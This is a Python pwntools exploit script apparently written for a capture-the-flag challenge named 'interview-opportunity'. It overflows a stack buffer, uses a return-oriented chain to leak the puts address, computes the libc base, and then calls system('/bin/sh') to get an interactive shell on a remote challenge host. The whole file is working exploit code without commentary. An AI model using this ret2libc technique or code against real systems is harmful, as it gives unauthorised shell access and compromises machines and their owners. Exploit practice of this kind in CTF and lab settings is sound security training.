#!/usr/bin/python3

from pwn import *

binary = context.binary = ELF('./interview-opportunity', checksec=False)

if args.REMOTE:
	libc = ELF('./libc.so.6', checksec=False)
	p = remote('mc.ax', 31081)
else:
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	p = process(binary.path)

pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

payload  = b''
payload += 0x22 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendline(payload)
for i in range(4): p.recvline()

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: {x}'.format(x = hex(libc.address)))

payload  = 0x22 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter(b'DiceGang?\n',payload)
for i in range(2): p.recvline()
p.interactive()

